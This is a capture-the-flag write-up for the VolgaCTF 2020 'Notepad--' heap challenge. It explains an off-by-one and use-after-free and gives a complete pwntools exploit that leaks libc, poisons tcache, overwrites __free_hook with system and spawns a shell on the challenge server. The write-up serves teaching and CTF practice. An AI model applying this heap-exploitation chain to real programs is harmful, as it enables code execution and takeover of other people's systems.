
# Notepad- -
> xikhud, 28/03/2020.

## Hint
Basic Use after free problem.

## Vulnerability
There is an off-by-one error when we update or view the tab, this lets us to leak the libc, and make malloc return an arbitrary address.
```cpp
unsigned __int64 __fastcall view_tab(book *a1, __int64 a2)
{
		//  truncated
  if ( v3 >= 0 && v3 <= (signed __int64)a1->tab_count ) // -> should be "<" instead of "<="
  {
    write(1, a1->tabs[v3].data, a1->tabs[v3].size);
  }
		// ......
}
```

## Plan
First we malloc a chunk that is not in tcache range ( > 1024 bytes is enough).
Then we malloc a random chunk so that when we free the chunk above, it doesn't merge with top chunk.
Then we free the first chunk, use the off-by-one error to leak "main_arena + 96".
Then use libc data base, we know that the version of the libc is 2.27.
Then we leak the libc base address. Now we get all the addresses we need.
With UAF vulnerbility, we modify the tcache, make malloc return &__free_hook.
Replace __free_hook with system address, when we call free("/bin/sh"), we will have a shell.


## Final Solution
```python
from pwn import *

#context.log_level = 'DEBUG'
#p = process('./notepad')
p = remote('notepad.q.2020.volgactf.ru', 45678)
libc = ELF('libc.so.6', checksec=False)

p.sendlineafter('[q]uit\n', 'a')
p.sendlineafter('name: ', '/bin/sh')
p.sendlineafter('[q]uit\n', 'p')
p.sendlineafter('pick: ', '1') # --------> switch to book number 1

def add(name, size, data):
    p.sendlineafter('[q]uit\n', 'a')
    p.sendafter('name: ', name)
    p.sendlineafter('): ', str(size))
    p.sendafter('data: ', data)

def delete(index):
    p.sendlineafter('[q]uit\n', 'd')
    p.sendlineafter('delete: ', str(index))

def view(index):
    p.sendlineafter('[q]uit\n', 'v')
    p.sendlineafter('view: ', str(index))
    r = p.recvuntil('Operations').replace('Operations', '')
    return r

def update(index, use_ntn, ntn, use_ndl, ndl, data):
    p.sendlineafter('[q]uit\n', 'u')
    p.sendlineafter('update: ', str(index))
    if not use_ntn:
        ntn = ''
    p.sendlineafter('skip): ', ntn)
    ndl = str(ndl)
    if not use_ndl:
        ndl = ''
    p.sendlineafter('same): ', ndl)
    p.sendafter('data: ', data)


add('xikhud\n', 1200, 'AAAAAAAA')

p.sendlineafter('[q]uit\n', 'q')

p.sendlineafter('[q]uit\n', 'a')
p.sendlineafter('name: ', 'book 2')
p.sendlineafter('[q]uit\n', 'p')
p.sendlineafter('pick: ', '2') # -----------> switch to book number 2

add('xikhud2\n', 0x90, 'BBBBBBBB') # --------> create top chunk
delete(1)
r = view(1)[:6] + '\x00\x00'  # ------------> leak main_arena + 96
r = u64(r)
log.info('main_arena + 96: 0x%X' % r)
base = r - 96 - 0x10 - libc.symbols['__malloc_hook']
log.info('Base: 0x%X' % base)
system = base + libc.symbols['system']
free_hook = base + libc.symbols['__free_hook']

add('xikhud\n', 1200, 'AAAAAAA') # ----------> pop the first chunk from unsorted bin
                                 # ----------> so that next malloc return a new chunk

add('last\n', 0x20, 'here')

p.sendlineafter('[q]uit\n', 'q')
p.sendlineafter('[q]uit\n', 'p')
p.sendlineafter('pick: ', '2') #  ----------> switch to book number 2

add('xikhud3\n', 0x20, 'top') #   ---------> new top chunk

p.sendlineafter('[q]uit\n', 'q')
p.sendlineafter('[q]uit\n', 'p')
p.sendlineafter('pick: ', '1') # ----------> switch to book number 1

delete(2)
update(2, False, ' ', False, ' ', p64(free_hook))  # modify tcache struct
add('last\n', 0x20, '/bin/sh\x00')

add('ZZZZ\n', 0x20, p64(system)) # ----> __free_hook = &system
delete(2) # -------> this call free("/bin/sh")

p.interactive()

# flag: VolgaCTF{i5_g1ibc_mall0c_irr3p@rable?}
```